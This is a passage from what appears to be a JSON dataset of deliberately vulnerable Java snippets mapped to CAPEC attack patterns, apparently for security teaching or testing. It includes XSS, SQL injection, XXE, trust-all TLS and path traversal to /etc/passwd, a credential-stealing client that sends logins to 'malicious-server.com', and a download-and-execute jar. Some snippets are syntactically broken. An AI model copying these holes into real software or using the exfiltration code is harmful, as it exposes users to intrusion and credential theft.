        "code_snippet": "public class ErrorHandler extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"query\");\n        try {\n            // Some operation that might throw an exception\n            if(userInput == null) throw new Exception(\"Invalid input\");\n            processQuery(userInput);\n        } catch (Exception e) {\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(\"<h2>Error occurred while processing: \" + userInput + \"</h2>\");\n            out.println(\"<div>Error details: \" + e.getMessage() + \"</div>\");\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable error handling page that directly reflects user input without proper sanitization. The error page incorporates user-controlled input directly into HTML output, making it susceptible to XSS attacks through malformed queries containing script elements."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "public class TagValidator {\n    private static final String[] BANNED_TAGS = {\"script\"};\n    \n    public static boolean isValidInput(String input) {\n        // Vulnerable: Only checks for exact match of banned tags\n        for (String bannedTag < BANNED_TAGS) {\n            if (input.contains(\"<\" + bannedTag + \">\")) {\n                return false;\n            }\n        }\n        return true;\n    }\n    \n    public static void processUserContent(String content) {\n        if (isValidInput(content)) {\n            // Vulnerable: Content with variations like <ScRiPt> or <SCRIPT> will pass validation\n            saveToDatabase(content);\n            renderInBrowser(content);\n        }\n    }\n}",
        "description": "This vulnerable code implements a basic tag validation system that fails to account for case variations and alternate syntax in HTML tags. The validator only checks for exact matches of banned tags, making it possible to bypass the security check using variations like <ScRiPt> or <SCRIPT>. The code also doesn't handle other XSS variants such as special characters, entities, or alternate script syntax, making it susceptible to XSS attacks through clever formatting of malicious input."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "public class InputProcessor {\n    public static String processUserInput(String input) {\n        // Disabled input validation for performance\n        // String filtered = input.replaceAll(\"[<>'\\\"]|(?i)script|alert\", \"\");\n        \n        // Direct use of unvalidated input\n        String sqlQuery = \"SELECT * FROM users WHERE username = '\" + input + \"'\";\n        \n        // No size limits on input\n        byte[] buffer = new byte[1024];\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.getBytes().length);\n        \n        // Disabled content type validation\n        // if (!input.matches(\"^[a-zA-Z0-9]*$\")) throw new IllegalArgumentException();\n        \n        return executeQuery(sqlQuery);\n    }\n    \n    private static String executeQuery(String query) {\n        // Query execution logic\n        return \"query_result\";\n    }\n}",
        "description": "This code demonstrates disabled input validation mechanisms by commenting out filtering logic, allowing unvalidated and potentially malicious input to flow through the system. It exhibits multiple vulnerabilities including SQL injection, buffer overflow potential, and lack of content type validation, representing a scenario where protective filtering mechanisms have been removed or disabled."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import java.io.ObjectInputStream;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic class VulnerableDataProcessor {\n    private String sensitiveData;\n\n    public void processXmlData(String xmlFilePath) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            // Vulnerable: XML parsing without external entity validation\n            builder.parse(xmlFilePath);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public Object deserializeData(byte[] serializedData) {\n        try {\n            ObjectInputStream ois = new ObjectInputStream(new java.io.ByteArrayInputStream(serializedData));\n            // Vulnerable: Direct deserialization of untrusted data\n            return ois.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable XML parsing and deserialization. The XML parser is configured without proper external entity validation, allowing XXE attacks. The deserialization method directly processes untrusted data without validation, and the class contains sensitive data without proper serialization controls."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "public class MaliciousClient {\n    private String serverUrl = \"http://legitimate-service.com/api\";\n    private String stolenAuthToken = null;\n    \n    public void authenticate(String username, String password) {\n        // Bypass normal authentication flow\n        stolenAuthToken = \"fake_token\";\n        // Secretly send credentials to attacker's server\n        sendToAttacker(username, password);\n    }\n    \n    public void processServerResponse(String response) {\n        // Modified client that ignores server security checks\n        if(response.contains(\"ACCESS_DENIED\")) {\n            // Override server's access control\n            response = response.replace(\"ACCESS_DENIED\", \"ACCESS_GRANTED\");\n        }\n        executeCommand(response);\n    }\n    \n    private void sendToAttacker(String... data) {\n        try {\n            Socket socket = new Socket(\"malicious-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(String.join(\",\", data));\n            socket.close();\n        } catch(Exception e) {}\n    }\n    \n    private void executeCommand(String cmd) {\n        try {\n            // Execute potentially dangerous commands\n            Runtime.getRuntime().exec(cmd);\n        } catch(Exception e) {}\n    }\n}",
        "description": "This code represents a malicious client that violates server-side security assumptions by bypassing authentication, tampering with server responses, and executing unauthorized commands. It includes hidden functionality to steal credentials and communicate with an attacker's server, while appearing as a legitimate client application."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "public class RegistryManager {\n    private Properties registry = new Properties();\n    \n    public void setRegistryValue(String key, String value) {\n        // No authentication or authorization check\n        registry.setProperty(key, value);\n        try {\n            FileOutputStream out = new FileOutputStream(\"app.registry\");\n            registry.store(out, \"Application Registry\");\n            out.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public String getServiceEndpoint(String serviceName) {\n        // Directly uses registry value without validation\n        return registry.getProperty(serviceName);\n    }\n    \n    public void storeCredentials(String username, String password) {\n        // Stores sensitive data in cleartext\n        registry.setProperty(\"user.\" + username, password);\n        registry.setProperty(\"auth.locked\", \"true\");\n    }\n}",
        "description": "This vulnerable code demonstrates a registry implementation that allows unauthorized modification of configuration settings, stores sensitive information in cleartext, and lacks proper access controls. The code fails to validate registry modifications, doesn't implement authentication checks, and stores sensitive credentials without encryption. The lock bit ('auth.locked') can be modified by anyone, and there's no integrity checking of stored values."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "public class UserDataCache {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public void storeUserCredentials(String username, String password) {\n        // Store sensitive data in cache without encryption\n        cache.put(\"user_\" + username, \"password:\" + password);\n        cache.put(\"ssn_\" + username, \"123-45-6789\");\n        cache.put(\"creditcard_\" + username, \"4111-1111-1111-1111\");\n    }\n\n    public String getUserData(String username, String dataType) {\n        // Retrieve sensitive data from cache without access control\n        return cache.get(dataType + \"_\" + username);\n    }\n\n    public void clearCache() {\n        // Incomplete cache clearing - doesn't null out references\n        cache.clear();\n    }\n}",
        "description": "This code demonstrates vulnerable caching of sensitive information by storing unencrypted credentials, SSN, and credit card data in a static cache without access controls. The cache is not properly cleared, and sensitive data remains accessible. The code lacks proper encryption, access control mechanisms, and secure cache management practices."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class AuthenticationManager {\n    private String storedCredentials = \"admin:password123\";\n    \n    public static boolean authenticate(String username, String password) {\n        // Store credentials in plaintext in client-side code\n        String credentials = username + \":\" + password;\n        \n        // Client-side only authentication\n        if(credentials.equals(\"admin:password123\")) {\n            return true;\n        }\n        return false;\n    }\n    \n    public static String getStoredCredentials() {\n        // Transmit credentials without encryption\n        return storedCredentials;\n    }\n    \n    public static boolean validateToken(String authToken) {\n        // Simple token validation without timestamp or nonce\n        return authToken.startsWith(\"AUTH_\");\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including storing credentials in plaintext, client-side only authentication, insufficient protection of credentials during transmission, and susceptibility to replay attacks due to basic token validation without proper security measures."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "public class CodeSigner {\n    private static final String SIGNING_KEY = \"MIIEvQIBADANBgkqhkiG9w0BAQEFAA...\"; // Hard-coded private key\n    private static final String KEY_PASSWORD = \"secretpass123\";\n\n    public static void signAndDistributeCode(String codeBundle) {\n        try {\n            // Load private key with weak permissions\n            File keyFile = new File(\"/tmp/signing_key.pem\");\n            FileWriter writer = new FileWriter(keyFile);\n            writer.write(SIGNING_KEY);\n            writer.close();\n            keyFile.setReadable(true, false); // World-readable permissions\n\n            // Sign code without proper validation\n            KeyStore keystore = KeyStore.getInstance(\"PKCS12\");\n            keystore.load(null, KEY_PASSWORD.toCharArray());\n            \n            // Download additional code from remote source without verification\n            URL url = new URL(\"http://untrusted-server.com/additional-code.jar\");\n            FileUtils.copyURLToFile(url, new File(\"additional-code.jar\"));\n\n            // Execute downloaded code without verification\n            Runtime.getRuntime().exec(\"java -jar additional-code.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable code signing practices including hard-coded credentials, incorrect permissions for critical signing keys, downloading and executing code without integrity checks, and potential for malicious code execution. The signing key is stored with world-readable permissions and the code downloads and executes additional code without proper verification."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "public class OnlineStore {\n    private double price = 100.0;\n\n    public boolean processOrder(String clientToken, double clientPrice) {\n        // Client-side validation only\n        if (validateClientToken(clientToken)) {\n            // Uses price sent from client without server-side validation\n            processPayment(clientPrice);\n            return true;\n        }\n        return false;\n    }\n\n    private boolean validateClientToken(String token) {\n        // Assumes client-side token validation is trustworthy\n        return true;\n    }\n\n    private void processPayment(double amount) {\n        // Process payment with client-provided amount\n        System.out.println(\"Processing payment: $\" + amount);\n    }\n\n    public static void downloadAndExecuteClientScript(String url) {\n        try {\n            // Downloads and executes code from client without verification\n            URLClassLoader loader = new URLClassLoader(new URL[]{new URL(url)});\n            Class<?> clientClass = loader.loadClass(\"ClientScript\");\n            clientClass.getMethod(\"execute\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates client-side security enforcement where the server blindly trusts client-provided values and validations. It processes payments based on client-side price information, accepts client-side authentication tokens without server validation, and downloads/executes client code without integrity checks. An attacker could modify the client to bypass price validation or authentication, or provide malicious code for execution."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class OnlineStore {\n    private double itemPrice = 29.99;\n\n    @WebServlet(\"/processOrder\")\n    public class OrderServlet extends HttpServlet {\n        protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n            try {\n                int quantity = Integer.parseInt(request.getParameter(\"quantity\"));\n                double clientCalculatedTotal = Double.parseDouble(request.getParameter(\"total\"));\n                String clientToken = request.getParameter(\"calculationToken\");\n\n                // Vulnerable: Relies on client-side calculation without server validation\n                if (clientToken != null) {\n                    processPurchase(clientCalculatedTotal);\n                }\n            } catch (Exception e) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST);\n            }\n        }\n\n        private void processPurchase(double total) {\n            // Process payment using client-provided total\n            chargeCustomer(total);\n        }\n    }\n}",
        "description": "This code represents a vulnerable online store implementation that relies on client-side price calculations. The server accepts a client-calculated total and a token without properly validating the calculation on the server side. An attacker could modify the client-side logic to send arbitrary totals, potentially purchasing items at reduced prices."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            Part filePart = request.getPart(\"file\");\n            String fileName = filePart.getSubmittedFileName();\n            // Unsafe: relies only on file extension for MIME type validation\n            if(fileName.toLowerCase().endsWith(\".txt\")) {\n                String contentType = \"text/plain\";\n                response.setContentType(contentType);\n                // Unsafe: content is served without proper sanitization\n                try (InputStream input = filePart.getInputStream();\n                     PrintWriter writer = response.getWriter()) {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        writer.println(line);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a file upload servlet that relies solely on file extension to determine MIME type and serves content without proper sanitization. An attacker could upload a malicious JavaScript file with a .txt extension, which when served, could be interpreted as script by the browser despite the text/plain content type, leading to XSS attacks."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "public class XSSVulnerableServlet extends HttpServlet {\n    private static final String[] BLOCKED = {\"<script>\", \"</script>\"};\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Incomplete denylist-based XSS protection\n        for (String blocked : BLOCKED) {\n            userInput = userInput.replace(blocked, \"\");\n        }\n        \n        // Unsafe direct output to HTML, including IMG tag\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<img src='\" + userInput + \"'>\");\n        out.println(\"<div>\" + userInput + \"</div>\");\n        out.println(\"</body></html>\");\n        \n        // Missing custom error handling\n        try {\n            // Some processing\n        } catch (Exception e) {\n            e.printStackTrace(response.getWriter());\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: incomplete XSS protection using a basic denylist, unsafe handling of user input in HTML output including IMG tag attributes, and exposure of sensitive information through default error handling. The code fails to properly sanitize user input and directly embeds it into the HTML response, making it vulnerable to various XSS attack vectors."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "public class SystemManager {\n    private static final String SYSTEM_INFO_FILE = \"/etc/system.conf\";\n    \n    public void executeCommand(String command) {\n        try {\n            // Undocumented backdoor command\n            if (command.startsWith(\"debug_\")) {\n                Runtime.getRuntime().exec(command.substring(6));\n                return;\n            }\n            \n            // Direct hardware access through JNI\n            if (command.equals(\"reset_hardware\")) {\n                System.loadLibrary(\"hardware_access\");\n                native void resetDevice();\n                return;\n            }\n            \n            // Exposing sensitive system information\n            if (command.equals(\"get_config\")) {\n                Files.readAllLines(Paths.get(SYSTEM_INFO_FILE))\n                    .forEach(System.out::println);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private native void resetDevice();\n}",
        "description": "This code demonstrates multiple vulnerabilities including undocumented debug commands, direct hardware access through low-level native functions, and exposure of sensitive system configuration. The executeCommand method can be misused to execute arbitrary system commands, access hardware directly, and leak system information, all through legitimate but potentially dangerous functionality that wasn't intended for general use."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "public class FileAccess {\n    public String readFile(String fileName) {\n        String basePath = \"/secure/files/\";\n        File file = new File(basePath + fileName);\n        try {\n            FileReader fr = new FileReader(file);\n            BufferedReader br = new BufferedReader(fr);\n            String content = br.readLine();\n            br.close();\n            return content;\n        } catch (IOException e) {\n            return \"Error reading file\";\n        }\n    }\n    \n    public static void main(String[] args) {\n        FileAccess fa = new FileAccess();\n        // Vulnerable to path traversal\n        String content = fa.readFile(\"../../../etc/passwd\");\n        System.out.println(content);\n    }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to a base path without proper validation or sanitization. An attacker can use '../' sequences to traverse directories and access files outside the intended directory. The code accepts a filename parameter and attempts to read it from a base directory, but fails to prevent directory traversal through relative path sequences."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "public class VulnerableErrorHandler extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            // Direct socket connection without framework\n            Socket socket = new Socket(\"backend.example.com\", 8080);\n            \n            // Dynamic class loading without validation\n            String className = request.getParameter(\"class\");\n            Class<?> dynamicClass = Class.forName(className);\n            Object instance = dynamicClass.newInstance();\n            \n            // Debug logging with sensitive information\n            Logger.debug(\"User credentials: \" + request.getHeader(\"Authorization\"));\n            Logger.debug(\"Connection details: \" + socket.toString());\n            \n            // No input validation framework used\n            processUserInput(request.getParameter(\"data\"));\n            \n        } catch (Exception e) {\n            // Default error page with stack trace\n            e.printStackTrace(response.getWriter());\n        }\n    }\n    \n    private void processUserInput(String input) {\n        // No validation framework, direct processing\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including uncontrolled error handling exposing sensitive information, direct socket usage instead of framework methods, unsafe dynamic class loading, debug logging of sensitive data, and lack of input validation framework. The code is particularly vulnerable to information exposure and malicious input manipulation."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "public class UserAuthenticator {\n    private static final Logger logger = Logger.getLogger(UserAuthenticator.class.getName());\n    \n    public boolean authenticateUser(String username, String password) {\n        try {\n            Connection conn = DriverManager.getConnection(\n                \"jdbc:mysql://localhost:3306/userdb\",\n                \"dbuser\", \"dbpass123\");\n            \n            String query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n            \n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            if (!rs.next()) {\n                logger.severe(\"Authentication failed for user: \" + username + \n                    \". Database query: \" + query + \n                    \". Connection details: \" + conn.getMetaData().toString());\n                return false;\n            }\n            return true;\n            \n        } catch (SQLException e) {\n            logger.severe(\"Database error: \" + e.getMessage() + \n                \"\\nStack trace: \" + Arrays.toString(e.getStackTrace()) + \n                \"\\nConnection properties: \" + e.toString());\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable logging practices where sensitive information (database queries, connection details, stack traces) is exposed in error logs. An attacker can intentionally cause errors by providing malformed inputs to gather information about the system's internal workings, database structure, and authentication mechanism through the detailed error messages and logs."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "public class UnsecureMessageHandler {\n    private static Socket clientSocket;\n\n    public static void handleIncomingMessage() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(12345);\n            clientSocket = serverSocket.accept();\n            \n            // No authentication or verification of sender\n            BufferedReader in = new BufferedReader(\n                new InputStreamReader(clientSocket.getInputStream()));\n            \n            String message = in.readLine();\n            \n            // Process message without checking integrity or origin\n            processMessage(message);\n            \n            // Send response without encryption\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(\"Message received: \" + message);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void processMessage(String message) {\n        // Critical operation without authentication\n        executeCommand(message);\n    }\n    \n    private static void executeCommand(String command) {\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code establishes an unsecured communication channel that accepts and processes messages without proper authentication, message integrity verification, or source validation. It allows direct command execution based on received messages, creating potential for unauthorized access, message tampering, and command injection attacks. The code also lacks encryption and channel security measures, making it susceptible to man-in-the-middle attacks and covert channel exploitation."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "public class InsecureSSLClient {\n    private static final String PASSWORD = \"secret123\";\n    private static final String USERNAME = \"admin\";\n\n    public void connectToServer() {\n        try {\n            // Accept any certificate, bypassing validation\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            };\n\n            SSLContext sc = SSLContext.getInstance(\"SSL\");\n            sc.init(null, trustAllCerts, new SecureRandom());\n            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n\n            // Disable hostname verification\n            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);\n\n            URL url = new URL(\"https://example.com/login\");\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            \n            // Send sensitive data without proper encryption checks\n            String credentials = USERNAME + \":\" + PASSWORD;\n            conn.setRequestProperty(\"Authorization\", \"Basic \" + \n                Base64.getEncoder().encodeToString(credentials.getBytes()));\n\n            conn.connect();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple SSL/TLS vulnerabilities including disabled certificate validation, accepting any hostname, and sending sensitive credentials over potentially compromised channels. It bypasses proper SSL/TLS security by trusting all certificates and hostnames, making it susceptible to man-in-the-middle attacks and credential theft."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "public class UDDIServiceClient {\n    public ServiceProvider lookupService(String uddiMessage) {\n        // Directly parse UDDI message without validation\n        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(uddiMessage)));\n        \n        // Extract service provider details without authenticity verification\n        String providerId = doc.getElementsByTagName(\"businessKey\").item(0).getTextContent();\n        String wsdlUrl = doc.getElementsByTagName(\"wsdlUrl\").item(0).getTextContent();\n        \n        // Create connection without proper channel security\n        URL url = new URL(wsdlUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        \n        // Process response without checking message integrity\n        ServiceProvider provider = new ServiceProvider(providerId);\n        provider.setEndpoint(conn.getInputStream());\n        \n        return provider;\n    }\n}",
        "description": "This code demonstrates vulnerable handling of UDDI messages by not validating XML input, failing to verify message authenticity, lacking proper channel security, and missing message integrity checks. It accepts and processes UDDI messages without proper validation against a schema, doesn't verify the source of messages, and creates insecure communication channels that could be intercepted or manipulated by attackers."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "public class XMLRoutingProcessor {\n    private String routingEndpoint;\n\n    public XMLRoutingProcessor(String routingEndpoint) {\n        this.routingEndpoint = routingEndpoint;\n    }\n\n    public String processXMLMessage(String xmlContent) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(xmlContent)));\n\n        // Vulnerable: No validation of routing path\n        NodeList routingPath = doc.getElementsByTagName(\"ws-routing\");\n        String nextHop = routingPath.item(0).getTextContent();\n\n        // Vulnerable: Using external input without validation\n        URL url = new URL(nextHop);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n\n        // Forward the XML content without preserving original source\n        try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {\n            writer.write(xmlContent);\n        }\n\n        // Read and return response without verifying intermediate processing\n        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        return response.toString();\n    }\n}",
        "description": "This vulnerable code implements an XML routing processor that accepts XML messages and forwards them through intermediate nodes. It contains multiple vulnerabilities: it doesn't validate XML against a schema (CWE-112), allows external XML entity references (CWE-611), processes routing paths without validation (CWE-610), doesn't preserve the original message source (CWE-441), and enables potential XML routing detour attacks by accepting untrusted routing paths and forwarding messages without proper security controls."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "public class InsecureSocketConnection {\n    private Socket clientSocket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void startConnection(String ip, int port) {\n        try {\n            clientSocket = new Socket(ip, port);\n            out = new PrintWriter(clientSocket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            \n            // Insecure protocol negotiation\n            String supportedEncryption = \"none,DES,AES\";\n            out.println(\"SUPPORTED_ENCRYPTION:\" + supportedEncryption);\n            \n            // No verification of server identity\n            String serverResponse = in.readLine();\n            \n            // Direct use of authentication token without verification\n            String authToken = \"user123:password456\";\n            out.println(\"AUTH:\" + authToken);\n            \n            // No protection against replay attacks\n            String message = \"COMMAND:transfer_money:100\";\n            out.println(message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple protocol-related vulnerabilities including insecure algorithm negotiation (CWE-757), client-side security enforcement (CWE-602), susceptibility to replay attacks (CWE-294), unverified communication endpoints (CWE-941), and direct socket usage in J2EE context (CWE-246). The code uses plaintext communication, lacks proper server verification, and implements no protection against replay attacks."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic class XMLParser {\n    public void parseXMLFile(String xmlFile) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Vulnerable: XML External Entity processing enabled by default\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n            factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            \n            // Parse potentially malicious XML file\n            builder.parse(xmlFile);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable XML parser configuration that allows processing of external entities without proper restrictions. The code enables external DTD and general entity processing, making it susceptible to XXE attacks. An attacker could craft an XML file with malicious external entity references that could lead to denial of service, file disclosure, or server-side request forgery attacks."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "public class VulnerableWebPage {\n    public String createProductPage(String productId, String externalContent) {\n        // Unsafely embedding user-controlled content and iframes\n        StringBuilder page = new StringBuilder();\n        page.append(\"<html><body>\");\n        page.append(\"<div id='mainContent'>\");\n        \n        // Vulnerable: Directly embedding external content without sanitization\n        page.append(externalContent);\n        \n        // Vulnerable: Allowing unrestricted iframe from any domain\n        page.append(\"<iframe src='\" + getProductDetails(productId) + \"'\");\n        page.append(\" style='position:absolute; opacity:0.01; z-index:999;'\");\n        page.append(\" width='100%' height='100%'></iframe>\");\n        \n        // Legitimate content that user thinks they're interacting with\n        page.append(\"<div class='product-display'>\");\n        page.append(\"<img src='product.jpg' onclick='purchase()' />\");\n        page.append(\"</div>\");\n        \n        page.append(\"</div></body></html>\");\n        return page.toString();\n    }\n    \n    private String getProductDetails(String productId) {\n        return \"product-details?id=\" + productId;\n    }\n}",
        "description": "This vulnerable code demonstrates an iFrame overlay attack by creating a web page that includes unsanitized user input and an unrestricted transparent iframe positioned over legitimate content. The iframe's opacity is set very low to make it nearly invisible, but it captures user interactions intended for the underlying content. The code fails to implement proper frame restrictions, input sanitization, and UI layer controls, making it susceptible to clickjacking and cross-site scripting attacks."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "public class SystemInfoServer {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String osName = System.getProperty(\"os.name\");\n        String osVersion = System.getProperty(\"os.version\");\n        String javaVersion = System.getProperty(\"java.version\");\n        String serverInfo = request.getServletContext().getServerInfo();\n        \n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        out.println(\"Server Information:\");\n        out.println(\"OS: \" + osName + \" \" + osVersion);\n        out.println(\"Java Version: \" + javaVersion);\n        out.println(\"Server: \" + serverInfo);\n        out.println(\"Debug Mode: \" + isDebugEnabled());\n        \n        // Expose detailed error information\n        try {\n            throw new Exception(\"Test Exception\");\n        } catch (Exception e) {\n            e.printStackTrace(out);\n        }\n    }\n    \n    private boolean isDebugEnabled() {\n        return true; // Debug mode always enabled\n    }\n}",
        "description": "This vulnerable code exposes sensitive system information through an HTTP endpoint, including OS details, Java version, server information, and stack traces. It also has debug mode permanently enabled, allowing attackers to gather detailed system fingerprinting information. This information can be used to identify specific versions and potential vulnerabilities in the system."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "public class SessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public static boolean authenticate(HttpServletRequest request) {\n        String sessionId = request.getCookie(\"sessionId\");\n        String userId = request.getParameter(\"userId\");\n\n        // Vulnerable: No validation of session cookie integrity\n        if (sessionId != null && sessions.containsKey(sessionId)) {\n            return true;\n        }\n\n        // Vulnerable: Creates new session without invalidating old ones\n        if (userId != null) {\n            String newSessionId = generateSessionId();\n            sessions.put(newSessionId, userId);\n            // No session timeout implemented\n            // No server-side session validation\n            return true;\n        }\n        return false;\n    }\n\n    private static String generateSessionId() {\n        return UUID.randomUUID().toString();\n    }\n}",
        "description": "This code demonstrates multiple session management vulnerabilities: it lacks session cookie validation, doesn't invalidate existing sessions when creating new ones, has no session expiration mechanism, and relies solely on client-side session IDs without proper server-side validation. An attacker could manipulate or reuse session cookies to gain unauthorized access."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "public class ResourceService {\n    private Map<String, List<Resource>> userResources = new HashMap<>();\n\n    public void allocateResource(String userId, Resource resource) {\n        // No limit checking on resource allocation\n        userResources.computeIfAbsent(userId, k -> new ArrayList<>())\n            .add(resource);\n\n        // Long-running operation that keeps the thread busy\n        processResource(resource);\n    }\n\n    private void processResource(Resource resource) {\n        try {\n            // Complex processing without timeout\n            while(resource.needsProcessing()) {\n                resource.performComplexCalculation();\n                Thread.sleep(1000);\n            }\n        } catch(InterruptedException e) {\n            // Ignored\n        }\n    }\n\n    public List<Resource> getUserResources(String userId) {\n        return userResources.getOrDefault(userId, new ArrayList<>());\n    }\n}",
